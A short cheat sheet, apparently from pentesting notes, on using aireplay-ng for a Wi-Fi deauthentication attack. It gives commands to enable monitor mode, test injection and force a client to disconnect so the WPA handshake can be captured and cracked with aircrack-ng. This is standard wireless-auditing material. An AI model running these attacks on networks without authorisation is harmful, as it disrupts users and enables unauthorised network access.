---
description: >-
  Generates traffic for use with aircrack-ng to crack WEP/WPA-PSK. Attacks:
  deauthentication (capture WPA handshakes), fake authentications, interactive
  packet replay, ARP request injection/reinjection.
---

# Aireplay-ng

#### Deauthentication Attack

Check packet injection before deauth: confirm your wireless card can inject to the target AP by pinging it and checking response rate (shows link quality). If you have two cards, compare their ping results to see which injects better.

{% code title="Start Monitor Mode" %}
```shellscript
sudo airmon-ng start wlan0
```
{% endcode %}

{% code title="Set Channel to 1" %}
```shellscript
sudo iw dev wlan0mon set channel 1
```
{% endcode %}

{% code title="Test for Packet Injection (Pre-requisite for performing attacks)" %}
```shellscript
sudo aireplay-ng --test wlan0mon
```
{% endcode %}

{% code title="Deauthentication request to one client" %}
```shellscript
sudo aireplay-ng -0 10 -a F5:D2:00:AF:69:67 -c D5:00:B2:AF:23:24 wlan0mon
```
{% endcode %}

Deauth causes the client to drop and reconnect — visible as increased **Lost** and **Frames** counts. Airodump-ng will capture the four-way handshake; use `-w` to save it to a `.pcap`, using airodump-ng, which you can run with **aircrack-ng** to crack the PSK.
